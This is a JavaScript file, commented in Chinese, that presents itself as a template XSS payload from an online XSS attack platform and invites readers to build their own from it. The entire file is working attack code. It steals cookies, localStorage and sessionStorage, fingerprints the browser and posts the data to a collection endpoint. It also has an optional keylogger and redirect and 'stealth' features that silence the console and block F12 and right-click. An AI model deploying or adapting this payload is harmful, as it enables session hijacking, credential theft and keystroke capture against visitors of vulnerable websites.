// 示例XSS Payload - 黑客仓库XSS在线平台
// 创建时间: 2025-11-18 10:00:00
// 
// 这是一个示例Payload文件,展示了如何创建一个功能完整的XSS攻击载荷
// 您可以基于这个模板创建自己的Payload

(function() {
    'use strict';
    
    // 配置信息
    var config = {
        serverUrl: window.location.origin + '/api/collect', // 数据接收地址
        enableCookieSteal: true,  // 是否窃取Cookie
        enableKeylogger: false,   // 是否启用键盘记录
        enableRedirect: false,    // 是否启用重定向
        redirectUrl: 'https://www.example.com', // 重定向目标
        stealthMode: true,        // 是否启用隐身模式
        debugMode: false          // 是否启用调试模式
    };
    
    // 调试日志
    function debugLog(message) {
        if (config.debugMode) {
            console.log('[💀 XSS Payload] ' + message);
        }
    }
    
    // 数据收集模块
    var dataCollector = {
        collectBasicInfo: function() {
            return {
                url: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                timestamp: new Date().toISOString()
            };
        },
        
        collectCookies: function() {
            if (!config.enableCookieSteal) return {};
            
            var cookies = {};
            
            // 获取document.cookie
            cookies.documentCookie = document.cookie;
            
            // 尝试获取localStorage
            try {
                var localData = {};
                for (var key in localStorage) {
                    if (localStorage.hasOwnProperty(key)) {
                        localData[key] = localStorage.getItem(key);
                    }
                }
                cookies.localStorage = localData;
            } catch (e) {
                debugLog('无法访问localStorage: ' + e.message);
            }
            
            // 尝试获取sessionStorage
            try {
                var sessionData = {};
                for (var key in sessionStorage) {
                    if (sessionStorage.hasOwnProperty(key)) {
                        sessionData[key] = sessionStorage.getItem(key);
                    }
                }
                cookies.sessionStorage = sessionData;
            } catch (e) {
                debugLog('无法访问sessionStorage: ' + e.message);
            }
            
            return cookies;
        },
        
        collectScreenInfo: function() {
            return {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                availableWidth: screen.availWidth,
                availableHeight: screen.availHeight,
                orientation: screen.orientation ? screen.orientation.angle : null
            };
        },
        
        collectBrowserInfo: function() {
            return {
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                appCodeName: navigator.appCodeName,
                product: navigator.product,
                productSub: navigator.productSub,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                buildID: navigator.buildID || null,
                oscpu: navigator.oscpu || null,
                hardwareConcurrency: navigator.hardwareConcurrency || null,
                maxTouchPoints: navigator.maxTouchPoints || null
            };
        }
    };
    
    // 网络通信模块
    var network = {
        sendData: function(data, callback) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', config.serverUrl, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (typeof callback === 'function') {
                            callback(xhr.status === 200);
                        }
                        debugLog('数据发送状态: ' + xhr.status);
                    }
                };
                
                xhr.onerror = function() {
                    debugLog('数据发送失败');
                    if (typeof callback === 'function') {
                        callback(false);
                    }
                };
                
                xhr.send(JSON.stringify(data));
                
            } catch (e) {
                debugLog('发送数据时出错: ' + e.message);
                if (typeof callback === 'function') {
                    callback(false);
                }
            }
        },
        
        sendBeacon: function(data) {
            try {
                if (navigator.sendBeacon) {
                    return navigator.sendBeacon(config.serverUrl, JSON.stringify(data));
                }
            } catch (e) {
                debugLog('Beacon发送失败: ' + e.message);
            }
            return false;
        }
    };
    
    // 隐身模块
    var stealth = {
        hideConsole: function() {
            if (!config.stealthMode) return;
            
            // 重写console方法
            var methods = ['log', 'info', 'warn', 'error', 'debug'];
            methods.forEach(function(method) {
                if (console[method]) {
                    console[method] = function() {};
                }
            });
        },
        
        detectDevTools: function() {
            if (!config.stealthMode) return;
            
            var devtools = /./;
            devtools.toString = function() {
                debugLog('开发者工具被检测到');
                // 可以在这里添加反调试逻辑
                return 'DevTools detected';
            };
            console.log('%c', devtools);
        },
        
        preventDebugging: function() {
            if (!config.stealthMode) return;
            
            // 禁用F12
            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123) {
                    e.preventDefault();
                    e.stopPropagation();
                }
            });
            
            // 禁用右键菜单
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
        }
    };
    
    // 主执行模块
    var executor = {
        execute: function() {
            debugLog('开始执行XSS Payload');
            
            // 收集所有数据
            var payload = {
                type: 'xss_payload',
                timestamp: new Date().toISOString(),
                basic: dataCollector.collectBasicInfo(),
                cookies: dataCollector.collectCookies(),
                screen: dataCollector.collectScreenInfo(),
                browser: dataCollector.collectBrowserInfo()
            };
            
            // 发送数据
            network.sendData(payload, function(success) {
                debugLog('数据发送' + (success ? '成功' : '失败'));
            });
            
            // 执行额外功能
            this.executeAdditionalFeatures();
            
            // 显示成功提示
            this.showSuccessMessage();
        },
        
        executeAdditionalFeatures: function() {
            // 重定向功能
            if (config.enableRedirect && config.redirectUrl) {
                setTimeout(function() {
                    debugLog('执行重定向到: ' + config.redirectUrl);
                    window.location.href = config.redirectUrl;
                }, 2000);
            }
            
            // 键盘记录功能
            if (config.enableKeylogger) {
                this.startKeylogger();
            }
        },
        
        startKeylogger: function() {
            // 简化的键盘记录功能
            var keys = '';
            document.addEventListener('keydown', function(e) {
                keys += e.key;
                
                if (keys.length > 10) {
                    network.sendData({
                        type: 'keystrokes',
                        keys: keys,
                        timestamp: new Date().toISOString()
                    });
                    keys = '';
                }
            });
        },
        
        showSuccessMessage: function() {
            // 在页面上显示成功提示
            var div = document.createElement('div');
            div.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #28a745;
                color: white;
                padding: 15px;
                border-radius: 5px;
                z-index: 9999;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                max-width: 300px;
                font-size: 14px;
            `;
            div.innerHTML = '💀 XSS Payload 执行成功！<br><small>数据已发送到服务器</small>';
            
            document.body.appendChild(div);
            
            // 3秒后自动移除
            setTimeout(function() {
                if (div.parentNode) {
                    div.parentNode.removeChild(div);
                }
            }, 3000);
        }
    };
    
    // 初始化
    function init() {
        debugLog('初始化XSS Payload');
        
        // 应用隐身模式
        stealth.hideConsole();
        stealth.detectDevTools();
        stealth.preventDebugging();
        
        // 执行payload
        executor.execute();
        
        console.log('💀 黑客仓库XSS在线平台 - Payload执行完成');
    }
    
    // 启动payload
    init();
    
})();